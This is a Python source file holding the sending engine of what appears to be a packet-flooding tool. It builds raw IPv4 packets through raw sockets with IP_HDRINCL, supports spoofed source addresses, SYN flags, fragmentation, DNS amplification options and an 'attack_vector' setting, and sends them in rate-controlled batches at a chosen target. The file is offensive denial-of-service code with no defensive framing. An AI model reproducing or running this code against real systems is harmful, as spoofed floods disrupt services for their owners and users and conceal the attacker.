import asyncio
import logging
import random
import socket
import traceback
from typing import Optional


def _extract_ipv4_dst(packet_bytes: bytes) -> Optional[str]:
    if len(packet_bytes) >= 34 and ((packet_bytes[14] >> 4) & 0xF) == 4:
        off = 14
    elif len(packet_bytes) >= 20 and ((packet_bytes[0] >> 4) & 0xF) == 4:
        off = 0
    else:
        return None
    dst = packet_bytes[off + 16 : off + 20]
    if len(dst) != 4:
        return None
    return ".".join(str(int(b)) for b in dst)


async def send_packet_async(
    packet,
    verbose,
    packet_no,
    loop,
    protocol,
    *,
    scapy_getter=None,
    ScapyUnavailableError=None,
):
    """Asynchronously send a raw IPv4 packet via raw socket."""
    del protocol, scapy_getter, ScapyUnavailableError

    def send_pkt(pkt):
        try:
            raw = bytes(pkt)
            target_ip = _extract_ipv4_dst(raw)
            if not target_ip:
                return False
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as sock:
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.sendto(raw, (target_ip, 0))
            return True
        except Exception:
            logging.error(f"Packet send error for packet {packet_no}:\n{traceback.format_exc()}")
            return False

    result = await loop.run_in_executor(None, send_pkt, packet)

    if result and verbose:
        logging.info(f"Packet {packet_no} sent.")
    elif not result:
        logging.error(f"Packet {packet_no} failed to send.")

    return result


async def packet_sender(
    packet_config,
    count,
    delay=0.0,
    rps=0.0,
    jitter=0.0,
    ramp=0.0,
    verbose=False,
    live_sent=None,
    live_errors=None,
    live_progress=None,
    *,
    scapy_getter=None,
    stats_fn,
    update_live_fn,
    log_error,
    cpu_packet_engine,
    packet_utils,
    ScapyUnavailableError=None,
):
    """
    Sends packets based on the provided configuration.
    Uses the zero-dependency CPU Packet Engine for fast packet generation,
    then sends via raw socket.
    """
    del ramp, scapy_getter, ScapyUnavailableError
    loop = asyncio.get_running_loop()
    sent_ok = 0
    send_err = 0
    packet_no = 0

    # Build a cpu_packet_engine.PacketConfig from the caller config
    try:
        spoof_opts = None
        if hasattr(packet_config, "spoof_opts") and packet_config.spoof_opts:
            spoof_opts = cpu_packet_engine.SpoofingOptions(
                mode=getattr(packet_config.spoof_opts, "mode", "realistic"),
                subnet=getattr(packet_config.spoof_opts, "subnet", None),
                list_file=getattr(packet_config.spoof_opts, "list_file", None),
            )

        engine_cfg = cpu_packet_engine.PacketConfig(
            target_ip=packet_config.target_ip,
            target_port=packet_config.target_port,
            protocol=getattr(packet_config, "protocol", "tcp"),
            spoof=getattr(packet_config, "spoof", False),
            spoof_opts=spoof_opts,
            payload=getattr(packet_config, "payload", None),
            tcp_flags=getattr(packet_config, "tcp_flags", "S"),
            ttl=getattr(packet_config, "ttl", None),
            tos=getattr(packet_config, "tos", None),
            window=getattr(packet_config, "window", None),
            fragment_enabled=getattr(packet_config, "fragment_enabled", False),
            fragment_size=getattr(packet_config, "fragment_size", 800),
            pad_size=getattr(packet_config, "pad_size", 0),
            attack_vector=getattr(packet_config, "attack_vector", "basic"),
            dns_name=getattr(packet_config, "dns_name", "example.com"),
            dns_qtype=getattr(packet_config, "dns_qtype", "A"),
            dns_edns=getattr(packet_config, "dns_edns", False),
            dns_recursive=getattr(packet_config, "dns_recursive", True),
        )
        use_cpu_engine = True
    except Exception as e:
        log_error(f"CPU Packet Engine config failed: {e}")
        use_cpu_engine = False

    if use_cpu_engine:
        # Fast path: raw socket + CPU engine
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log_error("Raw socket creation failed. Please run with sudo/root.")
            return stats_fn(attempted=count, sent=0, errors=count)
        except Exception as e:
            log_error(f"Failed to create raw socket: {e}")
            return stats_fn(attempted=count, sent=0, errors=count)

        BATCH_SIZE = 256
        dst_addr = (engine_cfg.target_ip, 0)
        sent_ok_snapshot = 0
        send_err_snapshot = 0
        pkt_bytes = b""

        try:
            if not engine_cfg.fragment_enabled:
                packet_view, packet_size = cpu_packet_engine.generate_packet_pool_view(
                    engine_cfg,
                    count,
                    uniform_size=True,
                    low_peak_memory=True,
                )
                if packet_size <= 0 or len(packet_view) < packet_size * count:
                    raise ValueError("invalid packet pool returned from cpu packet engine")

                pkt_bytes = bytes(packet_view[:packet_size]) if count > 0 else b""
                for i in range(count):
                    start = i * packet_size
                    end = start + packet_size
                    frag = packet_view[start:end]
                    packet_no += 1
                    try:
                        sock.sendto(frag, dst_addr)
                        sent_ok += 1
                    except Exception:
                        send_err += 1

                    update_live_fn(live_progress, 1)

                    base_delay = 0.0
                    if rps and rps > 0:
                        base_delay = 1.0 / float(rps)
                    elif delay and delay > 0:
                        base_delay = float(delay)

                    if base_delay > 0:
                        if jitter and jitter > 0:
                            j = base_delay * float(jitter)
                            await asyncio.sleep(max(0.0, base_delay + random.uniform(-j, j)))
                        else:
                            await asyncio.sleep(base_delay)

                    if (i + 1) % BATCH_SIZE == 0:
                        update_live_fn(live_sent, sent_ok - sent_ok_snapshot)
                        update_live_fn(live_errors, send_err - send_err_snapshot)
                        sent_ok_snapshot = sent_ok
                        send_err_snapshot = send_err
                        await asyncio.sleep(0)
            else:
                for i in range(count):
                    pkt_bytes = cpu_packet_engine.create_packet(engine_cfg)
                    fragments = cpu_packet_engine.fragment_packet(
                        pkt_bytes,
                        fragment_size=max(8, engine_cfg.fragment_size),
                    )

                    for frag in fragments:
                        packet_no += 1
                        try:
                            sock.sendto(frag, dst_addr)
                            sent_ok += 1
                        except Exception:
                            send_err += 1

                    update_live_fn(live_progress, 1)

                    base_delay = 0.0
                    if rps and rps > 0:
                        base_delay = 1.0 / float(rps)
                    elif delay and delay > 0:
                        base_delay = float(delay)

                    if base_delay > 0:
                        if jitter and jitter > 0:
                            j = base_delay * float(jitter)
                            await asyncio.sleep(max(0.0, base_delay + random.uniform(-j, j)))
                        else:
                            await asyncio.sleep(base_delay)

                    if (i + 1) % BATCH_SIZE == 0:
                        update_live_fn(live_sent, sent_ok - sent_ok_snapshot)
                        update_live_fn(live_errors, send_err - send_err_snapshot)
                        sent_ok_snapshot = sent_ok
                        send_err_snapshot = send_err
                        await asyncio.sleep(0)

        except KeyboardInterrupt:
            pass
        finally:
            sock.close()

        update_live_fn(live_sent, sent_ok - sent_ok_snapshot)
        update_live_fn(live_errors, send_err - send_err_snapshot)

        return stats_fn(
            attempted=packet_no,
            sent=sent_ok,
            errors=max(0, packet_no - sent_ok) if send_err <= 0 else send_err,
            bytes_sent_est=sent_ok * len(pkt_bytes) if count > 0 else 0,
        )

    # No Scapy fallback path anymore.
    del packet_utils
    return stats_fn(attempted=count, sent=0, errors=count)
